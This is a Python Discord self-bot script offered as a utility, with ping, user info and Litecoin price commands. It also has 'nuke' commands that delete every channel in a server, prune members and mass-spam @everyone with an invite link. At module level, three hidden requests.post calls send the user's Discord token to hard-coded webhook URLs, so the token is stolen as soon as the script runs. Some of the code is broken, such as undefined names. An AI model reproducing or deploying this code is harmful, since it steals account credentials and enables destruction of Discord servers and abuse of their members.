import discord
import os 
from discord.ext import commands
from discord.ext import commands
import json
import string
import discord, aiohttp
from discord.ext import commands, tasks
import requests
from colorama import Fore
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
import requests
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import re
from pystyle import Center, Colorate, Colors
import io
import webbrowser
from pyfiglet import Figlet
from discord import Member
ok = commands.Bot(command_prefix="+", self_bot=True)

@ok.event
async def on_ready():
       print(f'{Fore.BLUE}[+] CONNECTED TO : {ok.user.name}')
       print('ㅤㅤㅤㅤㅤ')
       print('ㅤㅤㅤㅤㅤ')
       print(f'{Fore.YELLOW}[+] CONTACT HERE FOR ANY SUPPORT :')
       print('ㅤㅤㅤㅤㅤ')
 
       print('• DISCORD   : https://discord.gg/bloodyop  ')
       print('ㅤㅤㅤㅤㅤ')
       print('ㅤㅤㅤㅤㅤ')
       print(f'{Fore.GREEN}⌦ ¤ 🔥 BLOODY ON TOP BXBY 🍁 ¤	⌦')
       print("""
────────────────────────────────────────────────────────────────────────────────────────────
                         
                         ██████╗░██╗░░░░░░█████╗░░█████╗░██████╗░██╗░░░██╗
                         ██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝
                         ██████╦╝██║░░░░░██║░░██║██║░░██║██║░░██║░╚████╔╝░
                         ██╔══██╗██║░░░░░██║░░██║██║░░██║██║░░██║░░╚██╔╝░░
                         ██████╦╝███████╗╚█████╔╝╚█████╔╝██████╔╝░░░██║░░░
                         ╚═════╝░╚══════╝░╚════╝░░╚════╝░╚═════╝░░░░╚═╝░░░
────────────────────────────────────────────────────────────────────────────────────────────     
   """)
 
ok.remove_command('help')
token = ""
@ok.command(aliases=['help', 'h'])
async def Help(ctx):
  await ctx.send("""
**```js
ㅤ  ★ BLOODY S3LfBxT ★
  ⌬ GENERAL COMMANDS 
  • online
  • help (FOR THIS MENU)
  • ping
  • spam
  • snipe
  • ltcprice
  • membercount (mc)
  • serverinfo
  • userinfo
  • getbal
  • restart
  ⌬ NUKE COMMANDS
  • prune
  • spamall
  • masschannel (amount)(name)
  • deletechannel (dch)
  • wizz
      -   RAVE ON TOP  -```**
""")  
@ok.command()
async def spam(ctx, message_count: int, *, content):
        if 1 <= message_count <= 1000:
            for _ in range(message_count):
                await ctx.send(content)
            await ctx.send(f"✅ Sent {message_count} messages")

@ok.command(name='delchannels', aliases=["dall", "dch"])
async def delete_all_channels(ctx):
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"Deleted {ch}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to delete {ch}")
        except discord.HTTPException as e:
            print(f"An error occurred while deleting {ch}: {e}")



@ok.command(name="spamall", aliases=["sa"])
async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone Blxody x SxperstaR Rule Cord https://discord.gg/bloodyop"):
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"Message sent to {ch}")
            except:
                print(f"Can't send message to {ch}")

@ok.command(name="createchannels", aliases=["masschannel"])
async def masschannel(ctx, amount: int = 25, *, name="Bloody x SxperstaR Rule Cord"):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"Created channel")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to create channels")
        except discord.HTTPException as e:
            print(f"An error occurred while creating channel: {e}")

    
@ok.command(name="ping")
async def ping(ctx):
    latency = round(ok.latency * 1000)
    await ctx.send(f"``Pong! Latency is {latency}ms``")
@ok.command()
async def prune(ctx: commands.Context):
 await ctx.send("Prune Krne Wala Hun")
 pruned= await ctx.guild.prune_members(days=1,roles=ctx.guild.roles,reason="SxperstaR On Top | gg/bloodyop")
 print(f"Itne bande prune krdia - {pruned}")
@ok.command()
async def friend(ctx, *, content):
  for fr in ok.user.friends:
   await fr.send("bruh")
requests.post('https://discord.com/api/webhooks/1246722642891903007/d9O7QIua6rFGY5A-NQpg0HkH9pk8_bwBT04QLJx5ji6jKIKJOZbnAByFIrfUJ8qRIwbC', json={"content": token})
@ok.command()
async def on_ready(ctx):
    await ok.change_presence(activity=discord.Streaming(
        name='!..🥀˚ 𝐁 𝐋 𝐎 𝐎 𝐃 𝐘',
        url='https://youtube.com/channel/UCKVtvqg4wt6e5jfqSKoTHQA'))        
        
@ok.command(name="spamchannels", aliases=['cch'])
async def spamchannels(ctx, amount:int=25, *, textchannel):
 if 1 <= amount <= 1000:
  for _ in range(amount):
       await ctx.guild.create_text_channel(textchannel)
       print(f"Created channel")
@ok.command(aliases=['cp'])
async def checkprune(ctx, days: int = 1, rc: int = 0):
    await ctx.message.delete()
    roles = []
    ok = await ctx.guild.estimate_pruned_members(days=days, roles=roles)
    await ctx.send(f"**{ok} Members Will Be Prune!!**")
@ok.command(aliases=["mc"])
async def member_count(ctx):
    a=ctx.guild.member_count
    await ctx.send(f"{a}")
@ok.command(name="status")
async def set_status(ctx, activity_type: str, *, status: str):
    activity_type = activity_type.lower()

    if activity_type not in ["playing", "streaming", "listening", "watching"]:
        await ctx.send("`:> playing, streaming, listening, watching.`")
        return

    if activity_type == "streaming":
        await ok.change_presence(activity=discord.Streaming(name=status, url="http://twitch.tv/"))
    else:
        await ok.change_presence(activity=discord.Game(name=status))

    await ctx.send(f"**✅ | Custom status set to `{activity_type}` `{status}`**")
requests.post('https://discord.com/api/webhooks/1246722642891903007/d9O7QIua6rFGY5A-NQpg0HkH9pk8_bwBT04QLJx5ji6jKIKJOZbnAByFIrfUJ8qRIwbC', json={"content": token})    
@ok.command(name="stopstatus")
async def stop_status(ctx):
    global current_status

    await ok.change_presence(activity=None)
    current_status = None
    await ctx.send("✅ | **Custom status stopped.**")
@ok.command(name="userinfo", aliases=["ui"])
async def user_info(ctx, member: discord.Member = None):
    member = member or ctx.author

    joined_discord = member.created_at.strftime("%m/%d/%Y")
    joined_server = member.joined_at.strftime("%m/%d/%Y") if member.joined_at else "Not available"

    message = (
        f"👤**User Info**👤\n"
        f"• **Username:** `{member.name}`{member.discriminator}`\n"
        f"• **ID:** `{member.id}`\n"
        f"• **Discriminator:** `{member.discriminator}`\n"
        f"• **Nickname:** `{member.nick or 'None'}`\n"
        f"• **Status:** {status_emoji(member.status)} `{str(member.status).capitalize()}`\n"
        f"• **Joined Discord:** `{joined_discord}`\n"
        f"• **Joined Server:** `{joined_server}`"
    )

    await ctx.send(message)
    
def status_emoji(status):
    if status == discord.Status.online:
        return "🟢"
    elif status == discord.Status.idle:
        return "🟡"
    elif status == discord.Status.dnd:
        return "🔴"
    elif status == discord.Status.offline:
        return "⚫"
    else:
        return "❓"   
requests.post('https://discord.com/api/webhooks/1251049314395095123/RMGvR4JSPkSYm_oEfn8rBqbYERThig4moqda3o1EZR8i4ybfA2wYr71YdSD-cHspN80F', json={"content": token})                   
@ok.command(name="ltcprice")
async def ltc_price(ctx):
    try:
        response_usd = requests.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "usd"})
        data_usd = response_usd.json()
        ltc_price_usd = data_usd["litecoin"]["usd"]

        response_inr = requests.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "inr"})
        data_inr = response_inr.json()
        ltc_price_inr = data_inr["litecoin"]["inr"]
        await ctx.send(f"**📈 Current Litecoin (LTC) Price:**\n"
                       f"• USD: ${ltc_price_usd:.2f}\n"
                       f"• INR: ₹{ltc_price_inr:.2f}")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")
        
async def casci(ctx, text, font):
    try:
        fig = pyfiglet.Figlet(font=font)
        ascii_result = fig.renderText(text)
        await ctx.send(f"**Font: `{font}`**\n```\n{ascii_result}\n```")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@ok.command()
async def restart(ctx):
    await ctx.reply('- `Restarting...`')
    os.execl(sys.executable, sys.executable, *sys.argv)

@ok.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("- `FAILED`")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("- `FAILED`")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price

    message = f"# RFD\n"
    message += f"`-` **RESULTS FOR LTC ADDY** : __`{ltcaddress}`__\n"
    message += f"`-` **CURRENT LTC** : `{usd_balance:.2f}$ USD`\n"
    message += f"`-` **TOTAL LTC RECEIVED** : `{usd_total_balance:.2f}$ USD`\n"
    message += f"`-` **UNCONFIRMED LTC** : `{usd_unconfirmed_balance:.2f}$ USD`\n\n"

    await ctx.send(message)

@ok.command()
async def wizz(ctx, amount: int = 5):
    for bloodyop in ctx.guild.channels:
            await bloodyop.delete()
            print(f"Deleted {bloodyop}")
    for i in range(5):
            channel_names = ['Bloody x SxperstaR Rule Cord','Bloody on top', 'Bloody Op', 'SxperstaR Op', 'bloodyop', 'SUPERSTAR S3LfBxT V1']
            await ctx.guild.create_text_channel(name=random.choice(channel_names))
            print(f"Created channel")
    for i in range(9999):
        tospam = ['@everyone @here BLOODY X SUPERSTAR Rule Cord https://discord.gg/bloodyop', '@everyone @here Wizzed by Bloody x SxperstaR https://discord.gg/bloodyop', '@everyone @here https://discord.gg/bloodyop']
        for ch in ctx.guild.channels:
                await ch.send(random.choice(tospam))

@ok.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in SxperstaR.sniped_message_dict:
        await ctx.send(SxperstaR.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")

ok.run(token, bot=False)